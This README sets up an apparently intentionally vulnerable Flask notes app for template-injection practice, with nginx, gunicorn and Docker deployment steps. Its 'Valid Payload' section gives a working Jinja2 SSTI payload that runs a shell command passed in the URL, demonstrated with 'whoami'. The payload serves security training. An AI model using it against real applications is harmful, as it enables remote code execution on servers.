# My Project

## Purpose
This project is a simple web application for managing notes. Users can add new notes and view a list of existing notes.

## Setup Instructions
1. Clone the repository:
   ```
   git clone https://github.com/farukerdem34/ssti_flask.git
   ```
2. Navigate to the project directory:
   ```
   cd ssti_flask
   ```
3. Install the required dependencies. If using Flask, you can do this with:
   ```
   pip install -r requirements.txt
   ```
4. Run the application:
   ```
   python3 app.py
   ```

## Using Bootstrap

### Online
To use Bootstrap online, include the following CDN links in the `<head>` section of your HTML file:

```html
<!-- Bootstrap CSS -->
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

<!-- Bootstrap JS and dependencies -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
```

### Offline
To use Bootstrap offline, download the Bootstrap files from the official website and include them in your project directory. Follow these steps:

1. Download the Bootstrap CSS and JS files from [Bootstrap's official website](https://getbootstrap.com/).
2. Save the downloaded files in a directory within your project, for example, `static/`.
3. Include the local Bootstrap files in the `<head>` section of your HTML file:

```html
<!-- Bootstrap CSS -->
<link href="static/css/bootstrap.min.css" rel="stylesheet">

<!-- Bootstrap JS and dependencies -->
<script src="static/js/jquery-3.5.1.slim.min.js"></script>
<script src="static/js/popper.min.js"></script>
<script src="static/js/bootstrap.min.js"></script>
```

## Usage
- Open your web browser and go to `http://127.0.0.1:5000` to access the application.
- Use the form to add a new note.
- Click on a note title to view its details.



# Production

## Install NGINX

```bash
sudo apt update -y
sudo apt install nginx -y
```

## Configure NGINX
```bash
sudo vim /etc/nginx/sites-available/ssti_flask/flask.conf
```

```
server {                                                                
     listen 80;                                                               
     server_name flask.domain.com;                                                      
                                                                         
     location / {                                                             
         include proxy_params;                                                     
         proxy_pass http://unix:/var/www/ssti_flask.sock;                                           
     }                                                                   
} 
```

```bash
sudo ln -s /etc/nginx/sites-available/ssti_flask /etc/nginx/sites-enabled/
```

## Install Gunicorn
```bash
sudo apt install gunicorn -y
```

```
gunicorn app:app --bind unix:/var/www/flask_ssti.sock
```


```plain
.
├── app.py
├── compose.yml
├── database.db 
├── Dockerfile
├── README.md
├── requirements.txt
├── static
│   ├── css
│   └── js
└── templates
    ├── index.html
    ├── login.html
    ├── note.html
    └── register.html

7 directories, 56 files
```


# Valid Payload
```jinja2
{{dict.__base__.__subclasses__()[353](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip()}}
```

go to
```plaintext
http://localhost/note/<id>?cmd=whoami
```


# Docker Compose

```bash
docker compose up -d --scale web=5
```
